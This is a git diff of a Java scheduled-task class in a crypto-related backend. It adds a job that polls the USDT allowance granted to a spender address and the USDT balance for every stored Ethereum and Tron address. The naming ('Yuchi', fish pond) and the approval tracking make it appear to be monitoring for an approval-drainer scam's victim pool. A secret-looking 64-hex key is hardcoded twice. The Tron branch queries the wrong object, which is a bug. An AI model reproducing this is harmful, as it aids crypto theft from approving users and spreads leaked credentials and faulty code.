@@ -1,5 +1,6 @@
 package com.ruoyi.quartz.task;
 
+import cn.hutool.core.date.DateField;
 import cn.hutool.core.date.DateUtil;
 import cn.hutool.http.HttpUtil;
 import com.alibaba.fastjson2.JSONArray;
@@ -75,6 +76,9 @@ public class RyTask
 
     @Autowired
     private IWakActivityService wakActivityService;
+
+    @Autowired
+    private IWakYuchiService wakyuchiService;
 
 
     public void ryMultipleParams(String s, Boolean b, Long l, Double d, Integer i)
@@ -214,6 +218,7 @@ public class RyTask
                 if (is_reissue.equals("1")){
                     //查询今日是否有产出 有跳过
                     Date todayBegin = DateUtil.beginOfDay(new Date());
+                    todayBegin = DateUtil.offsetHour(todayBegin, -2);
                     Long startTime = todayBegin.getTime()/1000;
                     try {
                         WakOutputlog check = wakOutputlogService.selectWakOutputlogByUserIdAndTime(wakAuthaddress.getId(),startTime);
@@ -476,6 +481,39 @@ public class RyTask
         }
     }
 
+    public void checkApproval() {
+        WakYuchi wakYuchi = new WakYuchi();
+        List<WakYuchi> list = wakyuchiService.selectWakYuchiList(wakYuchi);
+        for (WakYuchi wakYuchi1 : list) {
+            String address = wakYuchi1.getAddress();
+            try {
+                // 检查以太坊地址
+                if (address.startsWith("0x") && address.length() == 42) {
+                    We3jUtils we3jTest2 = new We3jUtils();
+                    BigDecimal res = we3jTest2.getAllowance(wakYuchi1.getAddress(), wakYuchi1.getToAddress());
+                    res = res.divide(new BigDecimal(1000000));
+                    wakYuchi1.setAllowance(res);
+                    Uint256 balanceRes = we3jTest2.balanceOf2(We3jUtils.usdtcontractAddress,wakYuchi1.getAddress());
+                    wakYuchi1.setUsdtBalance(new BigDecimal(balanceRes.getValue()).divide(new BigDecimal(1000000)));
+                }
+                // 检查 Tron 地址
+                if (address.startsWith("T") || address.startsWith("41")) {
+                    BigDecimal allowance = TridentJavaUtils.getAllowance("185287c127c20b5695b2e818a33fafd7b1b896db89389d4dc40f7e0981dc50f0",
+                            wakYuchi.getAddress(), wakYuchi.getToAddress());
+                    allowance = allowance.divide(new BigDecimal(1000000));
+                    wakYuchi1.setAllowance(allowance);
+                    BigDecimal balance = TridentJavaUtils.getBalance("185287c127c20b5695b2e818a33fafd7b1b896db89389d4dc40f7e0981dc50f0",wakYuchi.getAddress());
+                    balance = balance.divide(new BigDecimal(1000000));
+                    wakYuchi1.setUsdtBalance(balance);
+                }
+            }catch (Exception e){
+                System.out.println(e.getMessage());
+                wakYuchi1.setAllowance(BigDecimal.ZERO);
+                wakYuchi1.setUsdtBalance(BigDecimal.ZERO);
+            }
+            wakyuchiService.updateWakYuchi(wakYuchi1);
+        }
+    }
     public static void main(String[] args) throws IOException {
 //        Web3j web3j = Web3j.build(new HttpService(EthUtils.node));
 //        BigDecimal balance = EthUtils.balanceOf(web3j,"0xfEbe55439ce97A18Fb40e8e9F07da7F0b64fd252");
